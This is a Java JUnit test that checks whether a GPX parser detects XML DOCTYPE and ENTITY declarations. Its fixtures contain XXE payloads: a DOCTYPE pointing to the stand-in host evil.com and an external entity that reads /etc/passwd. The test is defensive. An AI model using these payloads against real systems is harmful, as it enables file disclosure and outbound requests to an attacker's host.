package models.ds;

import static org.junit.Assert.assertFalse;
import static org.junit.Assert.assertTrue;

import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.lang.reflect.Method;
import java.nio.file.Files;

import org.junit.Rule;
import org.junit.Test;
import org.junit.rules.TemporaryFolder;

public class StorageSecurityTest {

	@Rule
	public TemporaryFolder tempFolder = new TemporaryFolder();

	@Test
	public void testMovementDSRejectsXmlDoctypeAndEntity() throws Exception {
		// Valid GPX file
		File validGpx = tempFolder.newFile("valid.gpx");
		try (FileWriter writer = new FileWriter(validGpx)) {
			writer.write("<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n");
			writer.write("<gpx version=\"1.1\" creator=\"Test\">\n");
			writer.write("  <trk><name>Track 1</name></trk>\n");
			writer.write("</gpx>\n");
		}

		// Malicious GPX file with DOCTYPE
		File doctypeGpx = tempFolder.newFile("xxe_doctype.gpx");
		try (FileWriter writer = new FileWriter(doctypeGpx)) {
			writer.write("<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n");
			writer.write("<!DOCTYPE gpx SYSTEM \"http://evil.com/xxe\">\n");
			writer.write("<gpx version=\"1.1\" creator=\"Test\">\n");
			writer.write("</gpx>\n");
		}

		// Malicious GPX file with ENTITY
		File entityGpx = tempFolder.newFile("xxe_entity.gpx");
		try (FileWriter writer = new FileWriter(entityGpx)) {
			writer.write("<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n");
			writer.write("<!DOCTYPE gpx [ <!ENTITY ext SYSTEM \"file:///etc/passwd\"> ]>\n");
			writer.write("<gpx version=\"1.1\">&ext;</gpx>\n");
		}

		Method method = MovementDS.class.getDeclaredMethod("containsXmlEntityOrDocType", File.class);
		method.setAccessible(true);

		boolean validResult = (boolean) method.invoke(null, validGpx);
		boolean doctypeResult = (boolean) method.invoke(null, doctypeGpx);
		boolean entityResult = (boolean) method.invoke(null, entityGpx);

		assertFalse("Valid GPX should not contain DOCTYPE/ENTITY", validResult);
		assertTrue("GPX with DOCTYPE should be detected", doctypeResult);
		assertTrue("GPX with ENTITY should be detected", entityResult);
	}
}
